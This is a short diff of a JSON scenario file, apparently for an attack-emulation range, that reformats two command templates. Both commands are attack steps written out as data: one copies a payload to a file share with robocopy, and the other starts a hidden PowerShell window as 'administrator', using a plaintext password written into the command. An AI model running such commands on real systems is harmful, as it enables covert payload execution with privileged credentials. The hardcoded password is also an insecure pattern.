@@ -238,12 +238,7 @@
                 "target_1": "self.target_2",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "robocopy c:\\windows\\SysWow64\\ \\\\file\\share ",
-                            "self.payload_name"
-                        ]
-                    }
+                    "command": "robocopy c:\\windows\\SysWow64\\ \\\\file\\share ${self.payload_name}"
                 }
             }
         },
@@ -258,13 +253,7 @@
                 "target_1": "self.target_2",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$password = ConvertTo-SecureString 'Simspace1!Simspace1!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential ('administrator', $password); start-process powershell -credential $credential -argumentlist \"-noprofile -command &{\\file\\share ",
-                            "self.payload_name",
-                            " } -windowstyle Hidden"
-                        ]
-                    }
+                    "command": "powershell &{$password = ConvertTo-SecureString 'Simspace1!Simspace1!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential ('administrator', $password); start-process powershell -credential $credential -argumentlist \"-noprofile -command &{\\file\\share ${self.payload_name} } -windowstyle Hidden"
                 }
             }
         },
